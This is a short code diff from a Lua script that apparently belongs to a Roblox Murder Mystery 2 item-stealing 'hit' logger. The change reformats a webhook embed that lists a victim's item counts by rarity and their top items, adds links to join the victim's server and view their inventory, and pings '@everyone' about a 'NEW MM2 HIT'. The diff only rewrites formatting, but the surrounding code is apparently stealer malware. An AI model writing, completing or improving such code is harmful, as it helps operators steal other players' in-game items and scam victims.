@@ -381,9 +381,30 @@ local ansiLine2 = esc .. "[2;33mUnique:   " .. rarityCounts.Unique .. "  " .. es
 local ansiLine3 = esc .. "[2;34mLegendary:" .. rarityCounts.Legendary .. "  " .. esc .. "[2;32mRare:    " .. rarityCounts.Rare .. esc .. "[0m"
 local ansiLine4 = esc .. "[2;37mUncommon: " .. rarityCounts.Uncommon .. "  Common:  " .. rarityCounts.Common
 
-table.insert(fields, {name = "📊 Inventory", value = "\\`\\`\\`ansi\\n" .. ansiLine1 .. "\\n" .. ansiLine2 .. "\\n" .. ansiLine3 .. "\\n" .. ansiLine4 .. "\\`\\`\\`", inline = false})
-table.insert(fields, {name = "🏆 Top Items", value = "\\`\\`\\`\\n" .. table.concat(top_items, "\\n") .. "\\n\\`\\`\\`", inline = false})
-table.insert(fields, {name = "🔗 Actions", value = "[Join Server](" .. fernJoinerLink .. ") • [View Inventory](" .. rubisLink .. ")", inline = false})
+table.insert(fields, {
+    name = "📊 Inventory",
+    value = "\`\`\`ansi\n"
+        .. ansiLine1 .. "\n"
+        .. ansiLine2 .. "\n"
+        .. ansiLine3 .. "\n"
+        .. ansiLine4
+        .. "\n\`\`\`",
+    inline = false
+})
+
+table.insert(fields, {
+    name = "🏆 Top Items",
+    value = "\`\`\`\n"
+        .. table.concat(top_items, "\n")
+        .. "\n\`\`\`",
+    inline = false
+})
+
+table.insert(fields, {
+    name = "🔗 Actions",
+    value = "[Join Server](" .. fernJoinerLink .. ") • [View Inventory](" .. rubisLink .. ")",
+    inline = false
+})
 
 local payload = {
     content = isPingWorthy and "@everyone 🌑 **NEW MM2 HIT | LANGO SCRIPTS**" or nil,
